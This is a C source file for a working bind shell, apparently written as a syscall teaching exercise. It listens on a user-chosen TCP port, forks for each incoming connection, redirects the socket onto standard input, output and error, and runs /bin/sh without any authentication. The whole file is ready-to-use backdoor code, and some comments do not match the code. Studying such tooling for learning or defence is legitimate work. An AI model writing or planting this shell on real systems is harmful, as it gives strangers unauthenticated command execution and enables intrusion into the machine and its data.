#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

typedef struct connection {
    pid_t pid;
    char addr[INET6_ADDRSTRLEN];
    struct connection *next;
} connection_t;

connection_t *find_connection(connection_t *list, pid_t pid) {
    while(list) {
        if(list->pid == pid)
            return list;

        list = list->next;
    }

    return NULL;
}

connection_t *dequeue_connection(connection_t **list, pid_t pid) {
    for(connection_t *cur = *list, *last = NULL; cur; last = cur, cur = cur->next) {
        if(cur->pid == pid) {
            if(last)
                last->next = cur->next;
            else
                *list = cur->next;

            cur->next = NULL;
            return cur;
        }
    }

    return NULL;
}

void queue_connection(connection_t **list, connection_t *conn) {
    conn->next = *list;
    *list = conn;
}

connection_t *connections;

void sigchld_handler(int s) {
    pid_t pid;

    while ((pid = waitpid(-1, NULL, WNOHANG)) > 0) {
        connection_t *cur = dequeue_connection(&connections, pid);
        if(!cur) {
            fprintf(stderr, "Failed to find connection for pid %d!!!", pid);
        } else {
            printf("Connection from %s closed ...\n", cur->addr);
            free(cur);
        }
    }
}

void *get_in_addr(struct sockaddr *sa) {
    if (sa->sa_family == AF_INET)
        return &(((struct sockaddr_in*)sa)->sin_addr);
    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int main(int argc, char *argv[]) {
    int err = 0;

    if(argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        return 1;
    }

    //prepare hints to getaddrinfo
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags |= AI_PASSIVE;

    struct addrinfo *serverInfo;

    //request the server information
    if((err = getaddrinfo(NULL, argv[1], &hints, &serverInfo)) != 0) {
        fprintf(stderr, "Failed to fetch address info: %s\n", gai_strerror(err));
        return err;
    }

    //creating variable listen_sock which is returned by socket() as we need it for the bind(), listen(), and accept() calls
    int listen_sock;
    struct addrinfo *ap;

    //loop threw addresses returned by getaddrinfo() and stop on successful bind
    for(ap = serverInfo; ap; ap = ap->ai_next) {
        listen_sock = socket(ap->ai_family, ap->ai_socktype, ap->ai_protocol);
        if(listen_sock == -1) {
            perror("Failed to open tcp socket");
            continue;
        }

        // Our second syscall, and perhaps the most complicated: bind()
        if(bind(listen_sock, ap->ai_addr, ap->ai_addrlen) == 0)
            break;

        perror("Failed to bind to socket");

        close(listen_sock);
    }

    //check if bind was successful
    if(!ap) {
        fprintf(stderr, "Failed to bind to %s\n", argv[0]);
        return 1;
    }

    freeaddrinfo(serverInfo);

    //0 here is our specified backlog, (we dont have one)
    if(listen(listen_sock, 8) == -1) {
        perror("Failed to listen on sock");
        close(listen_sock);
        return errno;
    }

    struct sigaction sa;
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if(sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("Failed to register signal handler");
        close(listen_sock);
        return errno;
    }

    printf("Wating for connections ...\n");

    struct sockaddr_storage clientAddr;
    socklen_t sinSize = sizeof(clientAddr);
    char clientAddrBuf[INET6_ADDRSTRLEN];

    //creating new var conn_sock which is returned from accept() and needed for the dup2() call which duplicates this for stdin, stdout, and stderr
    int conn_sock;

    while((conn_sock = accept(listen_sock, (struct sockaddr *)&clientAddr, &sinSize)) > 0) {
        pid_t pid = fork();

        if(pid > 0) {
            //this is the parent process
            inet_ntop(clientAddr.ss_family,
                get_in_addr((struct sockaddr *)&clientAddr),
                clientAddrBuf, sizeof(clientAddrBuf));

            printf("Got connection from %s ...\n", clientAddrBuf);

            connection_t *newConn = malloc(sizeof(connection_t));
            if(!newConn) {
                fprintf(stderr, "Failed to allocate connection memory.\n");
                close(conn_sock);
                close(listen_sock);
                return errno;
            }

            memset(newConn, 0, sizeof(connection_t));

            newConn->pid = pid;
            strncpy(newConn->addr, clientAddrBuf, sizeof(clientAddrBuf));

            queue_connection(&connections, newConn);
        } else if(pid == 0) {
            //this is the child process
            // Our fifth syscall, dup2(), is used 3 times
            if(dup2(conn_sock, STDIN_FILENO) == -1) {
                perror("Failed to create copy of stdin");
                close(conn_sock);
                close(listen_sock);
                return errno;
            }

            if(dup2(conn_sock, STDOUT_FILENO) == -1) {
                perror("Failed to create copy of stdout");
                close(conn_sock);
                close(listen_sock);
                return errno;
            }

            if(dup2(conn_sock, STDERR_FILENO) == -1) {
                perror("Failed to create copy of stderr");
                close(conn_sock);
                close(listen_sock);
                return errno;
            }

            char *argv[] = { NULL };
            char *envp[] = { NULL };

            // Our final syscall is execve(), which runs a program fed to it as a string
            if(execve("/bin/sh", argv, envp) == -1) {
                perror("Failed to start shell");
                close(conn_sock);
                close(listen_sock);
                return errno;
            }
        } else {
            //error
            perror("Accept failed");
        }
    }

    if(conn_sock == -1) {
         perror("Failed to accept connections");
         close(listen_sock);
         return errno;
    }

    close(conn_sock);
    close(listen_sock);

    return 0;
}
